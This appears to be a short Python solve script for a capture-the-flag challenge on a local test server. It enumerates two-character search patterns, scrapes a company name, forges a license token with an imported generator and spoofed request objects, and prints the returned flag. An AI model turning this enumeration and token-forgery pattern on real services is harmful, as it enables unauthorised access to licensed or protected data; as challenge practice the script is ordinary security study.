#!/usr/bin/env python3
import requests,sys,string,random,re,logging
import token_generator
sess = requests.Session()
ip = "localhost"

if ip == "localhost":
    port = 5555
    url = f"http://{ip}:{port}/"
else:
    url = f"https://{ip}/"

ua = "python-requests/2.28.1"


class A2:
    def __init__(self):
        index=0
        self.data=['User-Agent']
    def get(self,a):
        global ua
        return ua

    def __iter__(self):
        self.index = 0
        return self
    def __next__(self):
        if self.index >= len(self.data):
            raise StopIteration
        result = self.data[self.index]
        self.index += 1
        return result

class A1:
    def __init__(self):
        self.headers = A2()
request=A1()

for c1 in string.ascii_uppercase + string.digits:
    for c2 in string.ascii_uppercase + string.digits:
        res = sess.get(url+"search?pattern="+c1+c2)
        # print(res.text)
        res2 = re.findall(r'<td>(.+?)</td>',res.text)
        if len(res2)>0:
            print(res2[0])
            company = res2[0]
            token = token_generator.GetTOK()
            print("TOKEN IS",)
            res = sess.get(url+"get_token?token="+token)
            res2 = re.findall(r"Your license is (\w+)",res.text)
            print("FLAG IS",res2[0])
